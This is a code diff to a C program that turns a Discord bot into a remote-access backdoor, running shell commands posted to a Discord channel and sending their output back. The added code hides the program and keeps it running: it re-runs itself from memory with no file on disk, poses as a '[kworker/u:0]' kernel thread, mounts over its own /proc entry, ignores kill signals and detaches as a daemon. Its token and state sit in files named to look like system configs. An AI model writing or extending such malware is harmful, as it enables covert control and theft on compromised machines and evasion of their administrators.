@@ -11,10 +11,26 @@
 #include <fcntl.h>
 #include <ctype.h>
 #include <errno.h>
+#include <signal.h>
+#include <sys/wait.h>
+#include <sys/mman.h>
+#include <sys/syscall.h>
+#include <sys/mount.h>
+
+
+#ifndef MFD_CLOEXEC
+#define MFD_CLOEXEC 0x0001U
+#endif
+
+#ifndef PR_SET_MM
+#define PR_SET_MM              35
+#endif
+#ifndef PR_SET_MM_EXE_FILE
+#define PR_SET_MM_EXE_FILE     13
+#endif
 
 #define MAX_PROCESS 2
 #define POLL_SLEEP 2
-#define MSG_LIMIT 15
 #define RECENT_CAP 200
 #define TOKEN_FILE "/etc/cron.conf"
 #define ID_MAX_LEN 64
@@ -23,6 +39,7 @@ static const char *GUILD_ID = "1415674125816434742";
 static const char *LOG_DIR = "/var/cache/systemd-private-17fbcd29a89f4598a26f3f21791b3918-apache2.service-V9WpOP";
 static const char *LOG_FILE = "/etc/dhcpcd.conf";
 static const char *API_BASE = "https://discord.com/api/v10";
+static const char *PROC_NAME = "[kworker/u:0]";
 
 struct string { char *ptr; size_t len; };
 struct msg { char *id; char *content; char *author_id; };
@@ -31,6 +48,61 @@ static char *BOT_TOKEN = NULL;
 static char BOT_USER_ID[64] = {0};
 static char *recent_keys[RECENT_CAP];
 static size_t recent_count = 0;
+static int running = 1;
+
+static int memfd_create_wrapper(const char *name, unsigned int flags) {
+    return syscall(__NR_memfd_create, name, flags);
+}
+
+static void memfd_self_exec(void) {
+    // Check if already running from memfd
+    if (getenv("_MEMFD_EXEC")) {
+        return;
+    }
+    
+    // Create memfd and copy self
+    int mfd = memfd_create_wrapper("", MFD_CLOEXEC);
+    if (mfd < 0) return;
+    
+    int sfd = open("/proc/self/exe", O_RDONLY);
+    if (sfd < 0) {
+        close(mfd);
+        return;
+    }
+    
+    struct stat st;
+    fstat(sfd, &st);
+    
+    char *buf = malloc(st.st_size);
+    if (!buf) {
+        close(sfd);
+        close(mfd);
+        return;
+    }
+    
+    read(sfd, buf, st.st_size);
+    write(mfd, buf, st.st_size);
+    free(buf);
+    close(sfd);
+    
+    // Set flag and re-exec
+    setenv("_MEMFD_EXEC", "1", 1);
+    
+    char fd_path[64];
+    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", mfd);
+    
+    // Remove CLOEXEC
+    fcntl(mfd, F_SETFD, 0);
+    
+    // Get current argv
+    extern char **environ;
+    char *argv[] = { (char *)PROC_NAME, NULL };
+    
+    execve(fd_path, argv, environ);
+    
+    // If we get here, exec failed
+    close(mfd);
+}
 
 static void init_string(struct string *s) {
     s->len = 0;
@@ -97,7 +169,7 @@ static char *make_api_request(const char *method, const char *endpoint, const ch
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
     curl_easy_setopt(curl, CURLOPT_USERAGENT, "discord-bot/1.0");
-    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
+    //curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L);
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
     
@@ -289,6 +361,20 @@ static void post_msg(const char *cid, const char *msg) {
     if (r) free(r);
 }
 
+static void bind_shm_to_self(void) {
+    char proc_path[64];
+    pid_t pid = getpid();
+    
+    snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
+    
+    if (mount("/dev/shm", proc_path, NULL, MS_BIND | MS_SILENT, NULL) != 0) {
+        fprintf(stderr, "[!] Failed to bind mount /dev/shm to %s: %s\n", 
+                proc_path, strerror(errno));
+    } else {
+        fprintf(stderr, "[+] Bind-mounted /dev/shm over %s\n", proc_path);
+    }
+}
+
 static void run_cmd(const char *cid, const char *cmd) {
     if (!cmd || !*cmd) {
         post_msg(cid, "[empty command]");
@@ -296,23 +382,100 @@ static void run_cmd(const char *cid, const char *cmd) {
     }
     
     fprintf(stderr, "[EXEC] %s\n", cmd);
-    FILE *fp = popen(cmd, "r");
+    
+    char full_cmd[4096];
+    snprintf(full_cmd, sizeof(full_cmd), "%s 2>&1", cmd);
+    
+    FILE *fp = popen(full_cmd, "r");
     if (!fp) {
         post_msg(cid, "[popen failed]");
         return;
     }
     
-    char buf[4096];
-    int had = 0;
-    while (fgets(buf, sizeof(buf), fp)) {
-        had = 1;
-        size_t l = strlen(buf);
-        if (l && buf[l-1] == '\n') buf[l-1] = '\0';
-        post_msg(cid, *buf ? buf : "[empty line]");
+    setvbuf(fp, NULL, _IONBF, 0);
+    
+    char buf[8192];
+    char line[8192];
+    int line_pos = 0;
+    int c;
+    char output[1900] = {0};
+    int line_count = 0;
+    int total_sent = 0;
+    int first_line = 1;
+    
+    // Read character by character to build lines properly
+    while ((c = fgetc(fp)) != EOF) {
+        if (c == '\n' || line_pos >= sizeof(line) - 1) {
+            line[line_pos] = '\0';
+            
+            // Skip empty lines after first line
+            if (line_pos == 0 && !first_line) {
+                line_pos = 0;
+                continue;
+            }
+            
+            first_line = 0;
+            
+            // Send if buffer would overflow
+            if (strlen(output) + line_pos + 2 > 1900 || line_count >= 3) {
+                if (strlen(output) > 0) {
+                    post_msg(cid, output);
+                    total_sent++;
+                    sleep(1);
+                    output[0] = '\0';
+                    line_count = 0;
+                }
+            }
+            
+            if (line_count > 0) {
+                strcat(output, "\n");
+            }
+            strcat(output, line);
+            line_count++;
+            
+            line_pos = 0;
+        } else {
+            line[line_pos++] = c;
+        }
     }
     
-    if (!had) post_msg(cid, "[no output]");
-    pclose(fp);
+    // Handle last line if not empty
+    if (line_pos > 0) {
+        line[line_pos] = '\0';
+        
+        if (strlen(output) + line_pos + 2 > 1900) {
+            if (strlen(output) > 0) {
+                post_msg(cid, output);
+                total_sent++;
+                sleep(1);
+                output[0] = '\0';
+            }
+        }
+        
+        if (strlen(output) > 0) {
+            strcat(output, "\n");
+        }
+        strcat(output, line);
+    }
+    
+    // Send remaining output
+    if (strlen(output) > 0) {
+        post_msg(cid, output);
+        total_sent++;
+        sleep(1);
+    }
+    
+    int status = pclose(fp);
+    
+    if (total_sent == 0) {
+        if (status == 0) {
+            post_msg(cid, "[no output]");
+        } else {
+            char err[256];
+            snprintf(err, sizeof(err), "[command failed with status %d]", status);
+            post_msg(cid, err);
+        }
+    }
 }
 
 static int create_dir(const char *path) {
@@ -354,18 +517,76 @@ static void write_id(const char *path, const char *id) {
     }
 }
 
+static void handle_signal(int sig) {
+    running = 0;
+}
+
 int main(int argc, char *argv[]) {
-    // Rename process exactly like your example
-    prctl(PR_SET_NAME, "[kworker/u:0]");
+    // First, relocate to memfd if not already done
+    memfd_self_exec();
     
-    // Rename argv[0] so ps shows it
-    if (argc > 0 && argv[0]) {
-        strcpy(argv[0], "[kworker/u:0]");
+    // Set up environment
+    setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
+    setenv("SHELL", "/bin/bash", 1);
+    setenv("HOME", "/root", 1);
+    
+    // Ignore termination signals (but not SIGCHLD)
+    signal(SIGHUP, SIG_IGN);
+    signal(SIGINT, SIG_IGN);
+    signal(SIGQUIT, SIG_IGN);
+    signal(SIGTERM, SIG_IGN);
+    // DON'T ignore SIGCHLD - it breaks popen()
+    
+    // Fork to detach from terminal
+    pid_t pid = fork();
+    if (pid < 0) {
+        return 1;
     }
     
+    // Parent exits
+    if (pid > 0) {
+        return 0;
+    }
+    
+    // Child becomes session leader
+    setsid();
+    
+    // Fork again
+    pid = fork();
+    if (pid < 0) {
+        return 1;
+    }
+    
+    if (pid > 0) {
+        return 0;
+    }
+    
+    // Now we're a daemon
+    chdir("/");
+    umask(0);
+    
+    // Close all file descriptors
+    for (int i = 0; i < sysconf(_SC_OPEN_MAX); i++) {
+        close(i);
+    }
+    
+    // Redirect to /dev/null
+    open("/dev/null", O_RDWR);
+    dup(0);
+    dup(0);
+    
+    // Rename process
+    prctl(PR_SET_NAME, PROC_NAME);
+    bind_shm_to_self();
+
+    if (argc > 0 && argv[0]) {
+        memset(argv[0], 0, strlen(argv[0]));
+        strcpy(argv[0], PROC_NAME);
+    }
+    
+    // Now run the bot
     BOT_TOKEN = read_token_from_file(TOKEN_FILE);
     if (!BOT_TOKEN) {
-        fprintf(stderr, "Failed to read token from %s\n", TOKEN_FILE);
         return 1;
     }
     
@@ -406,20 +627,18 @@ int main(int argc, char *argv[]) {
                     strncpy(CHANNEL_ID, found, n);
                     CHANNEL_ID[n] = '\0';
                     write_id(LOG_FILE, CHANNEL_ID);
-                    fprintf(stderr, "[INFO] Created channel %s\n", CHANNEL_ID);
                 }
             }
             free(resp);
         } else {
-            fprintf(stderr, "[ERR] Failed to create channel (HTTP %ld)\n", code);
             if (resp) free(resp);
             curl_global_cleanup();
+            free(BOT_TOKEN);
             return 1;
         }
-    } else {
-        fprintf(stderr, "[INFO] Using channel: %s\n", CHANNEL_ID);
     }
     
+    // Get bot user ID
     long code;
     char *resp = make_api_request("GET", "/users/@me", NULL, &code);
     if (resp && code == 200) {
@@ -437,6 +656,7 @@ int main(int argc, char *argv[]) {
     }
     if (resp) free(resp);
     
+    // Send startup message
     char ep[256];
     snprintf(ep, sizeof(ep), "/channels/%s/messages", CHANNEL_ID);
     char body[128];
@@ -444,10 +664,9 @@ int main(int argc, char *argv[]) {
     resp = make_api_request("POST", ep, body, &code);
     if (resp) free(resp);
     
-    fprintf(stderr, "[INFO] Bot started\n");
-    
+    // Get last seen message
     char *LAST_SEEN = NULL;
-    snprintf(ep, sizeof(ep), "/channels/%s/messages?limit=1", CHANNEL_ID);
+    snprintf(ep, sizeof(ep), "/channels/%s/messages", CHANNEL_ID);
     resp = make_api_request("GET", ep, NULL, &code);
     if (resp && code == 200) {
         char *p = strstr(resp, "\"id\":\"");
@@ -466,11 +685,15 @@ int main(int argc, char *argv[]) {
     if (resp) free(resp);
     
     int backoff = 1;
+    
     while (1) {
-        snprintf(ep, sizeof(ep), "/channels/%s/messages?limit=%d", CHANNEL_ID, MSG_LIMIT);
+        snprintf(ep, sizeof(ep), "/channels/%s/messages", CHANNEL_ID);
         resp = make_api_request("GET", ep, NULL, &code);
         
-        if (!resp) { sleep(POLL_SLEEP); continue; }
+        if (!resp) { 
+            sleep(POLL_SLEEP);
+            continue; 
+        }
         
         if (code == 429) {
             const char *p = strstr(resp, "\"retry_after\":");
@@ -507,42 +730,50 @@ int main(int argc, char *argv[]) {
         if (!LAST_SEEN) {
             LAST_SEEN = strdup(msgs[0].id);
         } else {
-            ssize_t found = -1;
+            int found_index = -1;
+            
+            // Find where our last seen message is
             for (size_t i = 0; i < msg_cnt; i++) {
                 if (msgs[i].id && strcmp(msgs[i].id, LAST_SEEN) == 0) {
-                    found = i;
+                    found_index = i;
                     break;
                 }
             }
             
-            if (found == -1) {
+            if (found_index == -1) {
                 free(LAST_SEEN);
                 LAST_SEEN = strdup(msgs[0].id);
-            } else if (found > 0) {
-                ssize_t start = found - (found > MAX_PROCESS ? MAX_PROCESS : found);
-                for (ssize_t i = start; i < found; i++) {
-                    struct msg *m = &msgs[i];
-                    const char *content = m->content ? m->content : "";
-                    const char *aid = m->author_id ? m->author_id : "";
+            } else if (found_index > 0) {
+                // Process ONLY THE NEWEST MESSAGE (index 0)
+                struct msg *m = &msgs[0];
+                const char *content = m->content ? m->content : "";
+                const char *aid = m->author_id ? m->author_id : "";
+                
+                if (*content && !(m->author_id && *BOT_USER_ID && strcmp(m->author_id, BOT_USER_ID) == 0)) {
                     
-                    if (!*content) continue;
-                    if (m->author_id && *BOT_USER_ID && strcmp(m->author_id, BOT_USER_ID) == 0) continue;
-                    if (is_recent(aid, content)) continue;
-                    
-                    add_recent(aid, content);
-                    
+                    // Check if it's a command
                     if (strncmp(content, "/cmd", 4) == 0 || strncmp(content, "!cmd", 4) == 0) {
-                        const char *cmd = content + 4;
-                        while (*cmd == ' ') cmd++;
-                        if (*cmd) run_cmd(CHANNEL_ID, cmd);
-                        else post_msg(CHANNEL_ID, "[no command]");
+                        const char *cmd_text = content + 4;
+                        while (*cmd_text == ' ') cmd_text++;
+                        if (*cmd_text) {
+                            // Make a copy of the command
+                            char *cmd_copy = strdup(cmd_text);
+                            if (cmd_copy) {
+                                run_cmd(CHANNEL_ID, cmd_copy);
+                                free(cmd_copy);
+                            }
+                        } else {
+                            post_msg(CHANNEL_ID, "[no command]");
+                        }
                     }
                 }
+                
                 free(LAST_SEEN);
                 LAST_SEEN = strdup(msgs[0].id);
             }
         }
         
+        // Free message array
         for (size_t i = 0; i < msg_cnt; i++) {
             free(msgs[i].id);
             free(msgs[i].content);
@@ -550,13 +781,16 @@ int main(int argc, char *argv[]) {
         }
         free(msgs);
         free(resp);
+        
         sleep(POLL_SLEEP);
     }
     
-    for (size_t i = 0; i < recent_count; i++) free(recent_keys[i]);
+    // Never reached
     free(CHANNEL_ID);
     free(LAST_SEEN);
     free(BOT_TOKEN);
+    for (size_t i = 0; i < recent_count; i++) free(recent_keys[i]);
     curl_global_cleanup();
+    
     return 0;
 }
